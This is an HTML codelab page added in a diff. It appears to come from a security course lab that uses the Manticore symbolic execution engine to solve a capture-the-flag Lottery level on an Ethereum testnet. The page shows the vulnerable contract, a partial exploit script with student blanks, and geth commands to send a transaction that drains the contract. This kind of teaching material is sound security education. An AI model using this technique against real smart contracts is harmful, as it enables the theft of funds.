@@ -1,0 +1,144 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>5.5: Manticore Lottery</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="B5.5_manticore_lottery" title="5.5: Manticore Lottery" environment="web" feedback-link="https://docs.google.com/document/d/1bnk73XqHxd0oc5KRjB2xc4jHVxWmozAtKlglNcR4lRA">
+<google-codelab-step label="Introduction" duration="1">
+<p>In this level, you will employ the Manticore symbolic execution engine to automatically generate a transaction that will solve the Lottery CTF level. You will then be able to directly submit solutions to the CTF framework using <code>geth</code>. </p>
+<h2 is-upgraded><strong>What you&#39;ll need</strong></h2>
+<ul>
+<li>Prior setup of <code>geth</code> and <code>tmux</code> sessions</li>
+<li>Knowledge of previous levels in the Security Innovations CTF</li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Connect to VM running geth" duration="1">
+<p>Connect back into VM you installed <code>geth</code> and <code>manticore</code> into. Within the VM, re-attach to your <code>tmux</code> session (or recreate it using the directions from the previous lab)</p>
+<pre>tmux attach</pre>
+<p>Ideally, you should have at least 3 sessions.</p>
+<ul>
+<li>A <code>geth</code> session synchronizing the light node with the Ropsten network via</li>
+</ul>
+<pre>geth \
+  --allow-insecure-unlock \
+  --ropsten \
+  --http --http.addr 127.0.0.1 \
+  --http.port 8545 --http.api admin,eth,net,web3,personal \
+  --nousb </pre>
+<ul>
+<li>An interactive geth session via the JSON RPC interface</li>
+</ul>
+<pre>geth attach http://127.0.0.1:8545/</pre>
+<ul>
+<li>A shell session (or two) within the directory <code>cs410b-src/manticore_labs/manticore_scripts</code>, for editing the Manticore solution scripts and running them.</li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Symbolic execution and Lottery" duration="10">
+<p>In this level, the exploit involves finding the winning lottery number that will allow us to grab all of the ETH. The source code should make it obvious which function we need to target. </p>
+<h3 is-upgraded><br><a href="https://github.com/wu4f/cs410b-src/blob/master/manticore_labs/SI_ctf_levels/Lottery.sol" target="_blank">SI_ctf_levels/Lottery.sol</a></h3>
+<pre><code>contract Lottery{
+
+    using SafeMath for uint256;
+
+    uint256 public totalPot;
+
+    constructor(address _ctfLauncher, address _player) public payable
+    {
+        totalPot = totalPot.add(msg.value);
+    }
+    
+    function() external payable{
+        totalPot = totalPot.add(msg.value);
+    }
+
+    function play(uint256 _seed) external payable {
+        require(msg.value &gt;= 1 finney, &#34;Insufficient Transaction Value&#34;);
+        totalPot = totalPot.add(msg.value);
+        bytes32 entropy = blockhash(block.number);
+        bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));
+        bytes32 target = keccak256(abi.encodePacked(entropy^entropy2));
+        bytes32 guess = keccak256(abi.encodePacked(_seed));
+        if(guess==target){
+            //winner
+            uint256 payout = totalPot;
+            totalPot = 0;
+            msg.sender.transfer(payout);
+        }
+    }    
+}</code></pre>
+</google-codelab-step>
+<google-codelab-step label="Manticore script" duration="15">
+<p>In this example, we&#39;ve setup the Manticore symbolic executor to inspect the Lottery contract for critical endpoints and we&#39;ve told it that it needs to find an input where our attacker gets all of the ether from the victim contract. The first things you will need to replace are the values of the variables <code>contract_balance</code> and <code>msg_value</code>. The <code>contract_balance</code> field needs to match how much ether is in the CTF contract. The <code>msg_value</code> field needs to have enough ETH to send a message to the function in the attacking contract. Look closely at the vulnerable function in <code>SI_ctf_levels/lottery.sol</code> to be able to come up with a value.</p>
+<h3 is-upgraded><a href="https://github.com/wu4f/cs410b-src/blob/master/manticore_labs/manticore_scripts/lottery_solution.py" target="_blank">manticore_scripts/lottery_solution.py</a></h3>
+<pre><code># Set the amount of ETH you want to obtain from the contract
+contract_balance = ???
+
+# Set the amount of ETH we need to send in our transaction (msg.value) to play.
+msg_value = ???</code></pre>
+<p>The next thing we will need to figure out is the size of our symbolic buffer. Remember that four bytes is needed for the function hash, plus any additional bytes to account for the function parameters. In the vulnerable function, pay close attention to the size of the function parameters.</p>
+<p>Next, we will send the transaction to the CTF. Notice how a value is specified in the value field.</p>
+<p>Lastly, we will explore the running states and return a <code>geth</code> transaction if the balance in the state can equal the amount of ether we placed into our virtual contract - both the contract balance and the message value. That is to say, our virtual contract was able to retrieve all its ether back.</p>
+<pre><code># Make symbolic buffer to hold msg.data and ask Manticore to calculate the &#34;winning&#34; value
+# 4 bytes for the function signature hash and ??? more for a uint256
+sym_args = m.make_symbolic_buffer(???)
+
+# Issue a symbolic transaction to the EVM by setting msg.data to symbolic buffer
+#   as well as msg.value to the amount needed to play
+m.transaction(
+    caller=user_account,
+    address=contract_account.address,
+    data=sym_args,
+    value=msg_value,
+    gas=gas
+)
+
+# Symbolically execute program to find an exploit that obtains our funds back.
+for state in m.running_states:
+    # this is just some silly manticore stuff
+    world = state.platform
+    # Check if funds can be retrieved
+    if state.can_be_true(world.get_balance(user_account.address) == contract_balance + msg_value):
+      # If so, add constraint
+      #   Then concretize symbolic buffer to provide one solution
+      state.constraints.add(world.get_balance(user_account.address) == contract_balance + msg_value)
+      conc_args = state.solve_one(sym_args)
+      # Print out our transaction to send to win
+      print(f&#39;&#39;&#39;eth.sendTransaction(&#123;&#123;data:&#34;0x{conc_args.hex()}&#34;, from:&#34;0x{from_address:040x}&#34;, to:&#34;0x{si_level_address:040x}&#34;, value:{msg_value}, gas:{gas}}})&#39;&#39;&#39;)
+      sys.exit(0)
+    print(&#39;No state found&#39;)</code></pre>
+<p>Now, inside your <code>tmux</code> shell, you can run the manticore script. Ensure that you use the correct address for the CTF level and your own wallet address for the fields in red (these fields can also be supplied by editing the script itself).</p>
+<pre><code>cd manticore_scripts
+python3 lottery_solution.py 0xYourWalletAddress 0xCtfLevelAddress</code></pre>
+<p>This will attack the SI level in <code>SI_ctf_levels/Lottery.sol</code> on the container and find an exploit that solves it. Take a screenshot of the Manticore script output with the transaction.</p>
+</google-codelab-step>
+<google-codelab-step label="Send the transaction" duration="5">
+<p>You can reverse the attack that the manticore script spits out and put the arguments into Remix, or you can directly paste it into <code>geth</code>&#39;s <code>sendTransaction</code> function to win the level automatically. In order to do this, you have to utilize the <code>geth</code> light node set up previously. (Note: that it must be fully synced to handle the transaction you will send it and you will need to have imported your wallet into it for it to use to sign transactions from your address)</p>
+<p>In your interactive <code>geth</code> session, unlock the wallet you previously instantiated:</p>
+<pre><code>personal.unlockAccount(eth.accounts[0],&#39;password&#39;,3600)</code></pre>
+<p>You can now send the transaction that Manticore generated for you. </p>
+<pre><code>eth.sendTransaction({data:&#34;???&#34;, from:&#34;???&#34;, to:&#34;???&#34;, value:&#34;???&#34;, gas:100000})</code></pre>
+<p>Screenshot the output (i.e. the resulting transaction hash), then paste the transaction hash into Etherscan and show a screenshot of it showing the transfer from the CTF level contract back to your wallet. Include both in your lab notebook. You do not need to commit the code into your repository.</p>
+<p>If your transaction takes a long time, try upping the gas price. This should complete the CTF level, reducing the contract to 0 ETH.</p>
+</google-codelab-step>
+<google-codelab-step label="Complete" duration="0">
+<p>Congratulations on applying symbolic execution to automatically retrieve money from this smart contract. Continue to the next level for more!</p>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
